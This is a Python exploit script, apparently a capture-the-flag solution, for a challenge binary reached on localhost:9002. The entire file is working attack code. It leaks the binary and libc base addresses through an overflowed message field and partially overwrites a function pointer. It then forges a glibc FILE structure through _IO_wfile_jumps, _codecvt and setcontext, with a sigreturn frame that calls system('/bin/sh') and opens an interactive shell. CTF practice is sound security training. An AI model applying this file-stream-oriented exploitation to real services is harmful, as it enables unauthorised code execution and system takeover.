#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './bin/chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'localhost', 'port':9002})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = './bin/libc-2.31.so')
env.select()

#==========

binf = ELF(bin_file)
offset_msleep       = binf.sep_function['msleep']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_usleep  = libc.sep_function['usleep']

#==========

def attack(conn, **kwargs):
    cs = ConversationStarter(conn)

    cs.edit(0, 0, cs.MSLEEP, b'a'*0x34)
    cs.edit(1, 0, cs.MSLEEP, b'A')
    addr_msleep = u(cs.start()[0].split(b': ')[1][0x34:])
    binf.address = addr_msleep - offset_msleep
    info('addr_binf_base    = 0x{:08x}'.format(binf.address))
    addr_readline   = binf.sep_function['readline']
    addr_bss        = binf.sep_section['.bss']

    cs.edit(0, 0, cs.USLEEP, b'b'*0x34)
    cs.edit(1, 0, cs.USLEEP, b'B')
    addr_libc_usleep = u(cs.start()[0].split(b': ')[1][0x34:])
    libc.address = addr_libc_usleep - offset_libc_usleep
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system        = libc.sep_function['system']
    addr_libc_str_sh        = next(libc.search(b'/bin/sh'))
    addr_libc_stdout        = libc.symbols['_IO_2_1_stdout_']
    addr_libc_wfile_jumps   = libc.symbols['_IO_wfile_jumps']

    cs.edit(1, 0, cs.MSLEEP, b'C')
    cs.edit(0, 0, cs.MSLEEP, b'c'*0x34+p16(addr_readline&0xffff))

    conn.sendlineafter(b'> ', b'2')
    conn.sendlineafter(b': ', b'2')

    fake_file  = b'\x00'*5
    fake_file += p64(addr_bss + 0x100)              # _lock
    fake_file += b'\x00'*0x8
    fake_file += p64(addr_libc_stdout+0xe0+0x8)     # _codecvt
    fake_file += p64(addr_libc_stdout+0xe0-0x20)    # _wide_data
    fake_file += b'\x00'*0x18
    fake_file += p32(1)
    fake_file += b'\x00'*0x14
    fake_file += p64(addr_libc_wfile_jumps)

    fake_wide_data  = p64(addr_bss+0x110)           # r/w

    fake_codecvt  = b'\x00'*0x28
    fake_codecvt += p64(libc.sep_function['setcontext'])
    fake_codecvt += b'\x00'*0x8
    fake_codecvt += p64(addr_libc_stdout+0xe0+0x8)

    frame = SigreturnFrame()
    frame.rdi = addr_libc_str_sh
    frame.rsp = addr_bss+0xf08
    frame.rip = addr_libc_system

    ucontext      = fake_codecvt.ljust(0x40, b'\x00')+bytes(frame)[0x40:0xe0]
    ucontext     += p64(binf.sep_section['.bss']+0x120) # r/w

    conn.send(fake_file + fake_wide_data + ucontext)
    conn.send(b'\x77' if env.check('remote') else b'\xa7')
    '''
    for i in range(0x100):
        conn.send(chr(i).encode())
    '''

    '''
    cs.start([5, b'hoge'], [0, b'a'*0x120])
    input('>')
    conn.shutdown('write')
    '''

class ConversationStarter:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter
        self.MSLEEP = 1
        self.USLEEP = 2

    def edit(self, idx, time, mu, msg):
        self.sendlineafter(b'> ', b'1')
        self.sendlineafter(b'index: ', str(idx).encode())
        self.sendlineafter(b'interval: ', str(time).encode())
        self.sendlineafter(b': ', str(mu).encode())
        if len(msg)<0x36:
            msg += b'\n'
        self.sendafter(b'message: ', msg)

    def start(self, name1=None, name2=None):
        self.sendlineafter(b'> ', b'2')
        if name1 is not None:
            self.sendlineafter(b': ', b'1')
            self.sendlineafter(b'1: ', str(name1[0]).encode())
            self.sendafter(b'1: ', name1[1])
            self.sendlineafter(b'2: ', str(name2[0]).encode())
            self.sendafter(b'2: ', name2[1])
        else:
            self.sendlineafter(b': ', b'2')

        return self.recvuntil(b'\n1. edit', drop=True, timeout=0.5).split(b'\n')

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()

if __name__=='__main__':
    main()

#==========
